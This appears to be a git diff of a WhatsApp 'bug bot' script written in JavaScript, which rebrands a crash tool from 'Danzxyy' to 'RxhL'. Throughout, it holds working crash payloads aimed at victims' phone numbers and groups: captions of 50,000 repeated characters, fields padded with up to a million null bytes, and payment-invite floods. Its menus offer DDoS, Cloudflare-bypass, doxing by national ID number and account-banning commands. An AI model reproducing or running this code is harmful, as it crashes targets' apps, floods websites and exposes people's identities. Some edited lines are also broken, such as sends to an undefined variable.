@@ -15,7 +15,6 @@ const timestampp = speed();
 const latensi = speed() - timestampp
 const moment = require('moment-timezone')
 const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./lib/storage')
-const jsobfus = require('javascript-obfuscator');
 const { JSDOM } = require('jsdom')
 module.exports = rxhl = async (rxhl, m, chatUpdate, store) => {
 try {
@@ -81,9 +80,9 @@ var rxhlloading = [
 "《 ███████▒▒▒▒▒》50%",
 "《 ██████████▒▒》80%",
 "《 ████████████》100%",
-"𝙻𝚘𝚊𝚍𝚒𝚗𝚐 𝚂𝚎𝚕𝚎𝚜𝚊𝚒..."
+"Loading Selesai..."
 ]
-let { key } = await rxhl.sendMessage(from, {text: '𝚂𝚃𝙰𝚁𝚃 𝚁𝚇𝙷𝙻 𝚅𝟽...'})
+let { key } = await rxhl.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})
 for (let i = 0; i < rxhlloading.length; i++) {
 await rxhl.sendMessage(from, {text: rxhlloading[i], edit: key });
 }
@@ -102,33 +101,6 @@ var formatted = scaled.toFixed(1) + ''
 if (/\.0$/.test(formatted))
 formatted = formatted.substr(0, formatted.length - 2)
 return formatted + postfix
-}
-
-async function obfus(query) {
-return new Promise((resolve, reject) => {
-try {
-const obfuscationResult = jsobfus.obfuscate(query,
-{
-compact: false,
-controlFlowFlattening: true,
-controlFlowFlatteningThreshold: 1,
-numbersToExpressions: true,
-simplify: true, 
-stringArrayShuffle: true,
-splitStrings: true,
-stringArrayThreshold: 1
-}
-);
-const result = {
-status: 200,
-author: `Me`,
-result: obfuscationResult.getObfuscatedCode()
-}
-resolve(result)
-} catch (e) {
-reject(e)
-}
-})
 }
 
 rxhl.sendButton = async (jid, buttons, quoted, opts = {}) => {
@@ -197,7 +169,7 @@ remoteJid: "status@broadcast"
 },
 message: {
 listResponseMessage: {
-title: `𝐃𝚫𝐍𝐗𝐙𝐘𝐘𝐂𝐑𝚪𝚫𝐒𝐇𝟔𝟔𝟔`
+title: `RxhlOfc`
 }
 }
 }
@@ -209,7 +181,7 @@ message: {
   "liveLocationMessage": {
     "degreesLatitude": "p",
     "degreesLongitude": "p",
-    "caption": `DANZXYY BUG WHATSAPP ✅`+"ꦾ".repeat(50000),
+    "caption": `RXHL BUG WHATSAPP ✅`+"ꦾ".repeat(50000),
     "sequenceNumber": "0",
     "jpegThumbnail": ""
      }
@@ -488,17 +460,17 @@ participant: '0@s.whatsapp.net'
 },
 message: {
 listResponseMessage: {
-title: `𝐃𝚫𝐍𝐗𝐙𝐘𝐘𝐂𝐑𝚪𝚫𝐒𝐇𝟔𝟔𝟔`
+title: `RxhlOfficial`
 }
 }
 }
 
 async function iponcrash(target) {
-await rxhl.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
+await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
 sleep(200)
 await rxhl.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
 sleep(200)
-await rxhl.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
+await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
 }
 
 async function bughomebutton(jid) {
@@ -537,309 +509,6 @@ sleep(500)
 sendExtendedTextMessage(jid)
 }
 
-async function LiveLocVIP(userJid) {
-    const messageContent = generateWAMessageFromContent(
-        userJid,
-        proto.Message.fromObject({
-            viewOnceMessage: {
-                message: {
-                    liveLocationMessage: {
-                        degreesLatitude: 'p',
-                        degreesLongitude: 'p',
-                        caption: '؂Ù†؃؄Ù½؂Ù†؃؄Ù½'.repeat(55000),
-                        sequenceNumber: '0',
-                        jpegThumbnail: '',
-                    },
-                },
-            },
-        }),
-        { userJid: userJid }
-    );
-    await rxhl.relayMessage(userJid, messageContent.message, {
-        participant: { jid: userJid },
-        messageId: messageContent.key.id,
-    });
-}
-async function ListMSGVIP(userJid) {
-    const messageContent = generateWAMessageFromContent(
-        userJid,
-        proto.Message.fromObject({
-            listMessage: {
-                title: 'RxhL'+'\0'.repeat(999999),
-                footerText: '.',
-                description: '.',
-                buttonText: null,
-                listType: 2,
-                productListInfo: {
-                    productSections: [
-                        {
-                            title: 'anjay',
-                            products: [{ productId: '4392524570816732' }],
-                        },
-                    ],
-                    productListHeaderImage: {
-                        productId: '4392524570816732',
-                        jpegThumbnail: null,
-                    },
-                    businessOwnerJid: '0@s.whatsapp.net',
-                },
-            },
-            footer: 'puki',
-            contextInfo: {
-                expiration: 604800,
-                ephemeralSettingTimestamp: '1679959486',
-                entryPointConversionSource: 'global_search_new_chat',
-                entryPointConversionApp: 'whatsapp',
-                entryPointConversionDelaySeconds: 9,
-                disappearingMode: { initiator: 'INITIATED_BY_ME' },
-            },
-            selectListType: 2,
-            product_header_info: {
-                product_header_info_id: 292928282928,
-                product_header_is_rejected: true,
-            },
-        }),
-        { userJid: userJid }
-    );
-    await rxhl.relayMessage(userJid, messageContent.message, {
-        participant: { jid: userJid },
-        messageId: messageContent.key.id,
-    });
-}
-
-async function LiveLocVIP2(userJid) {
-    const messageContent = generateWAMessageFromContent(
-        userJid,
-        proto.Message.fromObject({
-            viewOnceMessage: {
-                message: {
-                    liveLocationMessage: {
-                        degreesLatitude: 'p',
-                        degreesLongitude: 'p',
-                        caption: 'Ã˜‚Ã™†Ã˜Æ’Ã˜„Ã™½Ã˜‚Ã™†Ã˜Æ’Ã˜„Ã™½' + 'Ãª¦¾'.repeat(50000),
-                        sequenceNumber: '0',
-                        jpegThumbnail: '',
-                    },
-                },
-            },
-        }),
-        { userJid: userJid }
-    );
-    await rxhl.relayMessage(userJid, messageContent.message, {
-        participant: { jid: userJid },
-        messageId: messageContent.key.id,
-    });
-}
-
-async function ListMSGVIP2(recipientJid) {
-  const messageContent = generateWAMessageFromContent(
-    recipientJid,
-    proto.Message.fromObject({
-      listMessage: {
-        title: 'SÃŒ¸YÃª™°ÃŒ¸SÃª™°ÃŒ¸TÃª™°ÃŒ¸EÃª™°ÃŒ¸MÃª™°ÃŒ¸ UÃŒ¸IÃŒ¸ CÃŒ¸RÃª™°ÃŒ¸AÃª™°ÃŒ¸SÃª™°ÃŒ¸HÃª™°ÃŒ¸' + '\0'.repeat(920000), 
-        footerText: 'Ã Âº®Ã¢‚®Ã ½Å¾Ã ¸¨VÃª™°Ã ¸¨ Ã ¹–Ã Âº¡GÃª™°Ã ½€Ã¡ÃÅ“Ã¢Å“…Ã¢Æ’Å¸Ã¢•®',
-        description: 'Ã Âº®Ã¢‚®Ã ½Å¾Ã ¸¨VÃª™°Ã ¸¨ Ã ¹–Ã Âº¡GÃª™°Ã ½€Ã¡ÃÅ“Ã¢Å“…Ã¢Æ’Å¸Ã¢•®',
-        buttonText: null,
-        listType: 2,
-        productListInfo: {
-          productSections: [
-            {
-              title: 'lol',
-              products: [{ productId: '4392524570816732' }],
-            },
-          ],
-          productListHeaderImage: {
-            productId: '4392524570816732',
-            jpegThumbnail: null,
-          },
-          businessOwnerJid: '0@s.whatsapp.net',
-        },
-      },
-      footer: 'lol',
-      contextInfo: {
-        expiration: 600000,
-        ephemeralSettingTimestamp: '1679959486',
-        entryPointConversionSource: 'global_search_new_chat',
-        entryPointConversionApp: 'whatsapp',
-        entryPointConversionDelaySeconds: 9,
-        disappearingMode: { initiator: 'INITIATED_BY_ME' },
-      },
-      selectListType: 2,
-      product_header_info: {
-        product_header_info_id: 292928282928,
-        product_header_is_rejected: false,
-      },
-    }),
-    { userJid: recipientJid }
-  );
-
-  await rxhl.relayMessage(recipientJid, messageContent.message, {
-    participant: { jid: recipientJid },
-    messageId: messageContent.key.id,
-  });
-}
-
-
-async function ListMSGVIP3(userJid) {
-    const messageContent = generateWAMessageFromContent(
-        userJid,
-        proto.Message.fromObject({
-            viewOnceMessage: {
-                message: {
-                    interactiveMessage: {
-                        header: {
-                            title: '',
-                            subtitle: 'RxhL',
-                        },
-                        body: {
-                            text: 'RxhL',
-                        },
-                        footer: {
-                            text: 'RxhL',
-                        },
-                        nativeFlowMessage: {
-                            buttons: [
-                                {
-                                    name: 'cta_url',
-                                    buttonParamsJson: "{ display_text : 'RxhL', url : , merchant_url :  }",
-                                },
-                                {
-                                    name: 'cta_url',
-                      buttonParamsJson:
-                        "{ display_text : 'RxhL', url : , merchant_url :  }",
-                    },
-                    {
-                      name: 'cta_url',
-                      buttonParamsJson:
-                        "{ display_text : 'RxhL', url : , merchant_url :  }",
-                                },
-                            ],
-                            messageParamsJson: ''.repeat(999999),
-                        },
-                    },
-                },
-            },
-        }),
-        { userJid: userJid }
-    );
-    await rxhl.relayMessage(userJid, messageContent.message, {
-        participant: { jid: userJid },
-        messageId: messageContent.key.id,
-    });
-}
-async function LiveLocVIP3(recipientJid) {
-    var liveLocationMessage = generateWAMessageFromContent(
-        recipientJid,
-        proto.Message.fromObject({
-            viewOnceMessage: {
-                message: {
-                    liveLocationMessage: {
-                        degreesLatitude: 'p',
-                        degreesLongitude: 'p',
-                        caption:
-                  '؂Ù†؃؄Ù½؂Ù†؃؄Ù½' +
-                  'ê¦¾'.repeat(50000),
-                        sequenceNumber: '0',
-                        jpegThumbnail: '',
-                    },
-                },
-            },
-        }),
-        { userJid: recipientJid }
-    );
-    await rxhl.relayMessage(recipientJid, liveLocationMessage.message, {
-        participant: { jid: recipientJid },
-        messageId: liveLocationMessage.key.id,
-    });
-}
-async function BugButtonVIP(recipientJid) {
-    var interactiveMessage = generateWAMessageFromContent(
-        recipientJid,
-        proto.Message.fromObject({
-            viewOnceMessage: {
-                message: {
-                    interactiveMessage: {
-                        header: {
-                            title: '',
-                            subtitle: '',
-                        },
-                        body: { text: '' },
-                        footer: { text: '' },
-                        nativeFlowMessage: {
-                            buttons: [
-                                {
-                                    name: 'cta_url',
-                                    buttonParamsJson:
-                        '{ display_text : " ", url : , merchant_url : " "}',
-                                },
-                            ],
-                            messageParamsJson: '\0'.repeat(1000000),
-                        },
-                    },
-                },
-            },
-        }),
-        { userJid: recipientJid }
-    );
-    await rxhl.relayMessage(recipientJid, interactiveMessage.message, {
-        participant: { jid: recipientJid },
-        messageId: interactiveMessage.key.id,
-    });
-}
-
-async function ListMSGVIP4(userJid) {
-    const messageContent = generateWAMessageFromContent(
-        userJid,
-        proto.Message.fromObject({
-            listMessage: {
-                title:
-              '؂Ù†؃؄Ù½؂Ù†؃؄Ù½' + '\0'.repeat(920000),
-                footerText: '',
-                description: '',
-                buttonText: null,
-                listType: 2,
-                productListInfo: {
-                    productSections: [
-                        {
-                            title: 'anjay',
-                            products: [{ productId: '4392524570816732' }],
-                        },
-                    ],
-                    productListHeaderImage: {
-                        productId: '4392524570816732',
-                        jpegThumbnail: null,
-                    },
-                    businessOwnerJid: '0@s.whatsapp.net',
-                },
-            },
-            footer: 'puki',
-            contextInfo: {
-                expiration: 604800,
-                ephemeralSettingTimestamp: '1679959486',
-                entryPointConversionSource: 'global_search_new_chat',
-                entryPointConversionApp: 'whatsapp',
-                entryPointConversionDelaySeconds: 9,
-                disappearingMode: { initiator: 'INITIATED_BY_ME' },
-            },
-            selectListType: 2,
-            product_header_info: {
-                product_header_info_id: 292928282928,
-                product_header_is_rejected: false,
-            },
-        }),
-        { userJid: userJid }
-    );
-    await rxhl.relayMessage(userJid, messageContent.message, {
-        participant: { jid: userJid },
-        messageId: messageContent.key.id,
-    });
-}
-
-
-
-
-
-
 // Batas 
 
 
@@ -851,24 +520,15 @@ const replyy = (teks) => {
 return rxhl.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `RXHL DEVELOPER 🌛`,"body": `Hai ${pushname}`, "previewType": "PHOTO","thumbnail": rxhlimage,"sourceUrl": `https://youtube.com/@rxhlofc`}}}, { quoted:m})} 
 
 const replyz = (teks) => { 
-rxhl.sendMessage(from, { text: teks, contextInfo: {
-mentionedJid: [m.sender],
-externalAdReply: {
-showAdAttribution: false,
-renderLargerThumbnail: false,
-title: `© 𝐃𝚫𝐍𝐗𝐙𝐘𝐘𝐂𝐑𝚪𝚫𝐒𝐇𝟔𝟔𝟔`,
-body: `Halo ${<D A N Z X Y Y - C R A S H - M A K E R>} 👋`,
-previewType: "VIDEO",
-thumbnail: rxhlimage,
-sourceUrl: `https://youtube.com/@rxhlofc`,
-mediaUrl: `https://youtube.com/@rxhlofc`
-}
-},
-text: teks
-}, {
-quoted: m
-}) 
-}
+rxhl.sendMessage(from, { text: teks, contextInfo: { 
+"externalAdReply": { 
+"showAdAttribution": true, 
+"title": "VIP-RxhL-V6 ✅", 
+"containsAutoReply": true, 
+"mediaType": 1, 
+"thumbnail": rxhlimage, 
+"mediaUrl": "https://telegra.ph/file/36376f0b21362491e91d8.jpg", 
+"sourceUrl": "https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H" }}}, { quoted: m }) }
 
 const downloadMp3 = async (Link) => {
 try {
@@ -892,7 +552,7 @@ remoteJid: "status@broadcast"
 },
 message: {
 listResponseMessage: {
-title: `𝐃𝚫𝐍𝐗𝐙𝐘𝐘𝐂𝐑𝚪𝚫𝐒𝐇𝟔𝟔𝟔`
+title: `Rxhl Official 💸`
 }
 }
 }
@@ -902,8 +562,22 @@ switch(command) {
 // MENU
 case 'menu':
 await loading()
-ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
-┃⭔ Creator : 𝐃𝚫𝐍𝐗𝐙𝐘𝐘𝐂𝐑𝚪𝚫𝐒𝐇𝟔𝟔𝟔
+hohe = [
+  {
+                'name': 'single_select',
+                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
+              },
+              {
+   name: "cta_url",
+   buttonParamsJson: JSON.stringify({
+      display_text: "My Channel",
+      url: "https://www.youtube.com/@rxhlofc",
+      merchant_url: "https://www.youtube.com/@rxhlofc"
+   })
+}
+]
+ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
+┃⭔ Creator : Rxhl Official
 ┃⭔ Partner : -
 ┃⭔ Type : Case
 ┃⭔ Status : Online
@@ -915,8 +589,6 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃
 ┃⭔ ${prefix}self 
 ┃⭔ ${prefix}public 
-┃⭔ ${prefix}blok *628xxx*
-┃⭔ ${prefix}unblok *628xx*
 ┃⭔ ${prefix}setppbot
 ┃⭔ ${prefix}setppbot /full
 ┃
@@ -925,6 +597,8 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┏❐   \`List Menu\` 
 ┃
 ┃⭔ ${prefix}bugmenu 
+┃⭔ ${prefix}bugmenuv2
+┃⭔ ${prefix}bugmenuvip
 ┃⭔ ${prefix}specialmenuvip
 ┃⭔ ${prefix}aksesmenu
 ┃⭔ ${prefix}soundmenu
@@ -938,50 +612,29 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃⭔ ${prefix}infobot
 ┃
 ┗❐`
-anuges = {
-viewOnceMessage: {
-message: {
-interactiveMessage: {
-"contextInfo": {
-"mentionedJid": [m.sender],
-"isForwarded": true,
-"forwardedNewsletterMessageInfo": {
-"newsletterJid": '0@newsletter',
-"newsletterName": 'By RxhL+',
-"serverMessageId": 1
-},
-},
-"header": {
-"title": ewe,
-...(await prepareWAMessageMedia({ image: rxhlimage }, { upload: rxhl.waUploadToServer })),
-"hasMediaAttachment": true
-},
-"body": {
-"text": ""
-},
-"footer": {
-"text": "RxhL Official"
-},
-"nativeFlowMessage": {
-"buttons": [
-{
-"name": "cta_url",
-"buttonParamsJson": "{\"display_text\":\"Saluran WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\"}"
-}
-],
-"messageParamsJson": ""
-}
-}
-}
-}
-};
-rxhl.relayMessage(from, anuges, {})
+rxhl.sendButton(from,  hohe, m, {
+body: ewe,
+footer: `RxhlOfficial`
+})
 break
 case 'specialmenuvip':
 await loading()
-
-ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
-┃⭔ Creator : 𝐃𝚫𝐍𝐗𝐙𝐘𝐘𝐂𝐑𝚪𝚫𝐒𝐇𝟔𝟔𝟔
+hohe = [
+  {
+                'name': 'single_select',
+                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
+              },
+              {
+   name: "cta_url",
+   buttonParamsJson: JSON.stringify({
+      display_text: "My Channel",
+      url: "https://www.youtube.com/@rxhlofc",
+      merchant_url: "https://www.youtube.com/@rxhlofc"
+   })
+}
+]
+ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
+┃⭔ Creator : Rxhl Official
 ┃⭔ Partner : -
 ┃⭔ Type : Case
 ┃⭔ Status : Online
@@ -993,8 +646,6 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃
 ┃⭔ ${prefix}self 
 ┃⭔ ${prefix}public 
-┃⭔ ${prefix}blok *628xxx*
-┃⭔ ${prefix}unblok *628xx*
 ┃⭔ ${prefix}setppbot
 ┃⭔ ${prefix}setppbot /full
 ┃
@@ -1002,68 +653,35 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 
 ┏❐   \`VIP Menu\` 
 ┃
-┃⭔ ${prefix}ddosv1 *website duration*
-┃⭔ ${prefix}d-fetch *url time*
-┃⭔ ${prefix}egao *url time rps thread*
-┃⭔ ${prefix}mix *url time rps thread*
-┃⭔ ${prefix}floods *url time rps thread*
-┃⭔ ${prefix}kilua *url time rps thread*
-┃⭔ ${prefix}xchrome *url time rps thread*
-┃⭔ ${prefix}tls *url time rps thread*
-┃⭔ ${prefix}tls-v2 *url time rps thread*
-┃⭔ ${prefix}tls-bypass *url time rps thread*
-┃⭔ ${prefix}bypass-cf *url time rps thread*
-┃⭔ ${prefix}tls-vip *url time rps thread*
+┃⭔ ${prefix}ddos *website duration*
 ┃⭔ ${prefix}dox *nik*
 ┃⭔ ${prefix}getnik 
-┃⭔ ${prefix}enc *kode*
 ┃
 ┗❐`
-anuges = {
-viewOnceMessage: {
-message: {
-interactiveMessage: {
-"contextInfo": {
-"mentionedJid": [m.sender],
-"isForwarded": true,
-"forwardedNewsletterMessageInfo": {
-"newsletterJid": '0@newsletter',
-"newsletterName": 'By RxhL+',
-"serverMessageId": 1
-},
-},
-"header": {
-"title": ewe,
-...(await prepareWAMessageMedia({ image: rxhlimage }, { upload: rxhl.waUploadToServer })),
-"hasMediaAttachment": true
-},
-"body": {
-"text": ""
-},
-"footer": {
-"text": "RxhL Official"
-},
-"nativeFlowMessage": {
-"buttons": [
-{
-"name": "cta_url",
-"buttonParamsJson": "{\"display_text\":\"Saluran WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\"}"
-}
-],
-"messageParamsJson": ""
-}
-}
-}
-}
-};
-rxhl.relayMessage(from, anuges, {})
+rxhl.sendButton(from,  hohe, m, {
+body: ewe,
+footer: `RxhlOfficial`
+})
 break
 // BUG MENU
-case 'bugmenuv1':
+case 'bugmenu':
 await loading()
-
-ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
-┃⭔ Creator : 𝐃𝚫𝐍𝐗𝐙𝐘𝐘𝐂𝐑𝚪𝚫𝐒𝐇𝟔𝟔𝟔
+hohe = [
+  {
+                'name': 'single_select',
+                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
+              },
+              {
+   name: "cta_url",
+   buttonParamsJson: JSON.stringify({
+      display_text: "My Channel",
+      url: "https://www.youtube.com/@rxhlofc",
+      merchant_url: "https://www.youtube.com/@rxhlofc"
+   })
+}
+]
+ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
+┃⭔ Creator : Rxhl Official
 ┃⭔ Partner : -
 ┃⭔ Type : Case
 ┃⭔ Status : Online
@@ -1075,8 +693,6 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃
 ┃⭔ ${prefix}self 
 ┃⭔ ${prefix}public 
-┃⭔ ${prefix}blok *628xxx*
-┃⭔ ${prefix}unblok *628xx*
 ┃⭔ ${prefix}setppbot
 ┃⭔ ${prefix}setppbot /full
 ┃
@@ -1151,7 +767,7 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┏❐   \`Other Menu \`
 ┃⭔ ${prefix}bannedno *628xxxx*
 ┃⭔ ${prefix}tempban  *62|8xxx*
-┃⭔ ${prefix}ddosv1  *<website> <duration>*
+┃⭔ ${prefix}ddos  *<website> <duration>*
 ┗❐
 
 ┏❐   \`⚠️WARNING!!\`
@@ -1160,50 +776,29 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃> _ [🇬🇧] In the crash1jam and crash1hari bug menus, please don't use the menu too often. because this menu will send a lot of bugs and make you prone to getting banned
 ┃
 ┗❐`
-anuges = {
-viewOnceMessage: {
-message: {
-interactiveMessage: {
-"contextInfo": {
-"mentionedJid": [m.sender],
-"isForwarded": true,
-"forwardedNewsletterMessageInfo": {
-"newsletterJid": '0@newsletter',
-"newsletterName": 'By RxhL+',
-"serverMessageId": 1
-},
-},
-"header": {
-"title": ewe,
-...(await prepareWAMessageMedia({ image: rxhlimage }, { upload: rxhl.waUploadToServer })),
-"hasMediaAttachment": true
-},
-"body": {
-"text": ""
-},
-"footer": {
-"text": "RxhL Official"
-},
-"nativeFlowMessage": {
-"buttons": [
-{
-"name": "cta_url",
-"buttonParamsJson": "{\"display_text\":\"Saluran WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\"}"
-}
-],
-"messageParamsJson": ""
-}
-}
-}
-}
-};
-rxhl.relayMessage(from, anuges, {})
+rxhl.sendButton(from,  hohe, m, {
+body: ewe,
+footer: `RxhlOfficial`
+})
 break
 case 'bugmenuv2':
 await loading()
-
-ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
-┃⭔ Creator : 𝐃𝚫𝐍𝐗𝐙𝐘𝐘𝐂𝐑𝚪𝚫𝐒𝐇𝟔𝟔𝟔
+hohe = [
+  {
+                'name': 'single_select',
+                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
+              },
+              {
+   name: "cta_url",
+   buttonParamsJson: JSON.stringify({
+      display_text: "My Channel",
+      url: "https://www.youtube.com/@rxhlofc",
+      merchant_url: "https://www.youtube.com/@rxhlofc"
+   })
+}
+]
+ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
+┃⭔ Creator : Rxhl Official
 ┃⭔ Partner : -
 ┃⭔ Type : Case
 ┃⭔ Status : Online
@@ -1215,8 +810,6 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃
 ┃⭔ ${prefix}self 
 ┃⭔ ${prefix}public 
-┃⭔ ${prefix}blok *628xxx*
-┃⭔ ${prefix}unblok *628xx*
 ┃⭔ ${prefix}setppbot
 ┃⭔ ${prefix}setppbot /full
 ┃
@@ -1246,50 +839,29 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃⭔ ${prefix}dox <nik>
 ┃
 ┗❐`
-anuges = {
-viewOnceMessage: {
-message: {
-interactiveMessage: {
-"contextInfo": {
-"mentionedJid": [m.sender],
-"isForwarded": true,
-"forwardedNewsletterMessageInfo": {
-"newsletterJid": '0@newsletter',
-"newsletterName": 'By RxhL+',
-"serverMessageId": 1
-},
-},
-"header": {
-"title": ewe,
-...(await prepareWAMessageMedia({ image: rxhlimage }, { upload: rxhl.waUploadToServer })),
-"hasMediaAttachment": true
-},
-"body": {
-"text": ""
-},
-"footer": {
-"text": "RxhL Official"
-},
-"nativeFlowMessage": {
-"buttons": [
-{
-"name": "cta_url",
-"buttonParamsJson": "{\"display_text\":\"Saluran WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\"}"
-}
-],
-"messageParamsJson": ""
-}
-}
-}
-}
-};
-rxhl.relayMessage(from, anuges, {})
+rxhl.sendButton(from,  hohe, m, {
+body: ewe,
+footer: `RxhlOfficial`
+})
 break
-case 'bugmenuv3':
+case 'bugmenuvip':
 await loading()
-
-ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
-┃⭔ Creator : 𝐃𝚫𝐍𝐗𝐙𝐘𝐘𝐂𝐑𝚪𝚫𝐒𝐇𝟔𝟔𝟔
+hohe = [
+  {
+                'name': 'single_select',
+                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
+              },
+              {
+   name: "cta_url",
+   buttonParamsJson: JSON.stringify({
+      display_text: "My Channel",
+      url: "https://www.youtube.com/@rxhlofc",
+      merchant_url: "https://www.youtube.com/@rxhlofc"
+   })
+}
+]
+ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
+┃⭔ Creator : Rxhl Official
 ┃⭔ Partner : -
 ┃⭔ Type : Case
 ┃⭔ Status : Online
@@ -1301,14 +873,12 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃
 ┃⭔ ${prefix}self 
 ┃⭔ ${prefix}public 
-┃⭔ ${prefix}blok *628xxx*
-┃⭔ ${prefix}unblok *628xx*
 ┃⭔ ${prefix}setppbot
 ┃⭔ ${prefix}setppbot /full
 ┃
 ┗❐
 
-┏❐   \`Bug Crash Chat V3\`
+┏❐   \`Bug Crash Chat VIP\`
 ┃
 ┃⭔ ${prefix}all-dvc2 *+628xxx*
 ┃⭔ ${prefix}killwhatsapp *+628xxx*
@@ -1325,347 +895,36 @@ ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
 ┃
 ┗❐
 
-┏❐   \`Bug Crash Grup V3\`
+┏❐   \`Bug Crash Grup VIP\`
 ┃
 ┃⭔ ${prefix}crashgc-v1 *ID GRUP*
 ┃⭔ ${prefix}crashgc-v2 *ID GRUP*
 ┃
 ┗❐ `
-anuges = {
-viewOnceMessage: {
-message: {
-interactiveMessage: {
-"contextInfo": {
-"mentionedJid": [m.sender],
-"isForwarded": true,
-"forwardedNewsletterMessageInfo": {
-"newsletterJid": '0@newsletter',
-"newsletterName": 'By RxhL+',
-"serverMessageId": 1
-},
-},
-"header": {
-"title": ewe,
-...(await prepareWAMessageMedia({ image: rxhlimage }, { upload: rxhl.waUploadToServer })),
-"hasMediaAttachment": true
-},
-"body": {
-"text": ""
-},
-"footer": {
-"text": "RxhL Official"
-},
-"nativeFlowMessage": {
-"buttons": [
-{
-"name": "cta_url",
-"buttonParamsJson": "{\"display_text\":\"Saluran WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H\"}"
-}
-],
-"messageParamsJson": ""
-}
-}
-}
-}
-};
-rxhl.relayMessage(from, anuges, {})
-break
-case 'bugmenuvip':
-await loading()
-
-ewe = `┏❐  ⌜ Danzxyy - Bot - V7 ⌟  ❐
-┃⭔ Creator : 𝐃𝚫𝐍𝐗𝐙𝐘𝐘𝐂𝐑𝚪𝚫𝐒𝐇𝟔𝟔𝟔
-┃⭔ Partner : -
-┃⭔ Type : Case
-┃⭔ Status : Online
-┃⭔ Mode : ${rxhl.public ? 'Public' : 'Self'}
-┃⭔ Prefix : Multi 
-┗❐
- 
-┏❐   \`Bot Fitur\` 
-┃
-┃⭔ ${prefix}self 
-┃⭔ ${prefix}public 
-┃⭔ ${prefix}blok *628xxx*
-┃⭔ ${prefix}unblok *628xx*
-┃⭔ ${prefix}setppbot
-┃⭔ ${prefix}setppbot /full
-┃
-┗❐
-
-┏❐   \`Bug Andro / IP VIP\`
-┃
-┃⭔ ${prefix}bug-vip *+628xxx*
-┃⭔ ${prefix}super-vip *+628xxx*
-┃⭔ ${prefix}samsung-vip *+628xxx*
-┃⭔ ${prefix}oppo-vip *+628xxx*
-┃⭔ ${prefix}vivo-vip *+628xxx*
-┃⭔ ${prefix}xiaomi-vip *+628xxx*
-┃⭔ ${prefix}infinix-vip *+628xxx*
